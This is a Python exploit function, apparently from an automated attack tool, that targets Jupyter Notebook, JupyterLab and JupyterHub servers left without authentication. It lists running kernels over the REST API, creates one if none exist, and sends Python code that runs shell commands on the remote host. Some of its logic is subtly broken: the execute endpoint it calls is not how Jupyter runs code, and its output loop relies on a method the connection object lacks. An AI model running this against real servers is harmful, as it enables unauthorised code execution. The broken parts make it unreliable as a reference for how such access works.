def run(host: str, port: int, timeout: int = 30) -> dict:
    """
    Exploits Jupyter Notebook/Server services with weak or no authentication.
    Targets Jupyter instances running on HTTP ports (default 8888) that either
    have no authentication configured, use default tokens, or allow unauthenticated
    API access. This works on Jupyter Notebook, JupyterHub, and JupyterLab instances
    where the authentication mechanism is misconfigured or disabled. The exploit
    connects to the Jupyter REST API, checks for unauthenticated access, and if
    successful, executes arbitrary code via the kernel API to demonstrate access.
    Conditions: Jupyter service must be running and accessible, authentication
    must be disabled or token must be guessable/default.
    """
    try:
        import http.client
        import json
        import urllib.parse
        
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        
        # Check if Jupyter is running
        conn.request("GET", "/api")
        response = conn.getresponse()
        
        if response.status != 200:
            return {"success": False, "data": "", "evidence": ""}
        
        api_info = json.loads(response.read().decode())
        
        # Try to access kernels without authentication
        conn.request("GET", "/api/kernels")
        response = conn.getresponse()
        
        if response.status != 200:
            return {"success": False, "data": "", "evidence": ""}
        
        kernels = json.loads(response.read().decode())
        
        # Create a new kernel if none exist
        if not kernels:
            conn.request("POST", "/api/kernels", json.dumps({"name": "python3"}))
            response = conn.getresponse()
            if response.status != 201:
                return {"success": False, "data": "", "evidence": ""}
            kernel_info = json.loads(response.read().decode())
            kernel_id = kernel_info["id"]
        else:
            kernel_id = kernels[0]["id"]
        
        # Execute arbitrary code
        code = "import socket,subprocess,os;print(os.popen('id').read())"
        execute_payload = {
            "code": code,
            "language": "python3",
            "silent": False,
            "store_history": False
        }
        
        conn.request("POST", f"/api/kernels/{kernel_id}/execute", 
                    json.dumps(execute_payload))
        response = conn.getresponse()
        
        if response.status != 201:
            return {"success": False, "data": "", "evidence": ""}
        
        # Read execution result
        result = json.loads(response.read().decode())
        
        # Get output
        outputs = []
        while True:
            msg = json.loads(conn.recv(4096).decode()) if hasattr(conn, 'recv') else {}
            if msg.get("msg_type") == "execute_result":
                outputs.append(msg.get("content", {}).get("data", {}).get("text/plain", ""))
            elif msg.get("msg_type") == "stream":
                outputs.append(msg.get("content", {}).get("text", ""))
            elif msg.get("status") == "ok":
                break
        
        data_str = "\n".join(outputs) if outputs else "Code executed successfully"
        
        return {
            "success": True,
            "data": {"kernel_id": kernel_id, "output": data_str, "api_info": api_info},
            "evidence": f"Jupyter API accessible at {host}:{port}, kernel {kernel_id} executed code"
        }
        
    except Exception as e:
        return {"success": False, "data": "", "evidence": str(e)}